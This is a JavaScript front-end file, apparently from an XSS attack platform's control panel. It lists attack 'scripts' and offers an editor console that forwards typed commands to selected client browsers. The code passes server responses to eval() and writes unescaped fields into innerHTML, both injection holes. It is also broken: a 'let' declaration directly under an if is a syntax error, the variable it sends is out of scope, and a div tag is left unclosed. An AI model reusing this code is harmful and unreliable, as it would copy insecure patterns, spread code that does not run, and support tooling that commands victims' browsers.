function getScripts() {
    var data;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/getScripts/', true);
    const container = document.querySelector('.scripts-container');
    container.innerHTML = `
        <div class="outer-div">
            <div class="inner-div">
                <img src="static/icons/load.png" alt="加载中...">
                <span>加载中....</span>
            </div>
        </div>
    `;
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            data = eval(xhr.responseText); // 打印服务器响应
            container.innerHTML = '';
            data.forEach(item => {
                const itemDiv = document.createElement('div');
                itemDiv.className = 'item-box';
                itemDiv.innerHTML = `
                    <div class="device-header">
                        <span class="device-name"><h3><strong>${item.name}</strong></h3></span>
                        <div class="device-circle" onclick="loadContent('devices')" data-url="${item.url}"><img src="static/icons/goto.png" alt="去使用"></div>
                    </div>
                    <a href="https://starxss.starbot.top/view.php?id=${item.id}" id="script-detail">
                        <div class="detail-box">版本：${item.version}</div>
                        <div class="detail-box">${item.detail}</div
                    </a>
                `;
                container.appendChild(itemDiv);
            });
        }
    };
    xhr.send();
}

var fullInput = "";
var lastIn = "";
var htmlIn = '';
var thisIn = '';

function openEditor() {
    openModal('console-modal');
    const selects = document.getElementsByClassName("selected");
    let ss = [];
    for (let i = 0; i < selects.length; i++) {
        ss.push(selects[i].getAttribute("data-url"));
    }
    console.log(ss);
    const { createEditor, createToolbar } = window.wangEditor;

    const editorConfig = {
        placeholder: '输入命令',
        onChange(editor) {

            htmlIn = editor.getText();
            thisIn = htmlIn.replace(fullInput, '');
            // console.log('1',htmlIn);
            // console.log('2',fullInput)
            // console.log('3',thisIn);

            fullInput = htmlIn;
            if (thisIn === "\n") {
                lastIn = '';
                var xhr = new XMLHttpRequest();
                xhr.open('POST', '/updateConsole/', true);
                xhr.setRequestHeader("Content-Type", "application/json")
                if(nowDevice==='') let sendData = {
                    device: "",
                    clients: ss
                }
                else {
                    let sendData = {
                        device: nowDevice+"/",
                        clients: ss
                    }
                }
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        data = eval(xhr.responseText); // 打印服务器响应


                    } else {
                        lastIn += thisIn;
                    }
                    // 也可以同步到 <textarea>

                }
                xhr.send(sendData);
            }
        }
    }

    const editor = createEditor({
      selector: '#editor-container',
      html: '<p><br></p>',
      config: editorConfig,
      mode: 'default', // or 'simple'
    })
}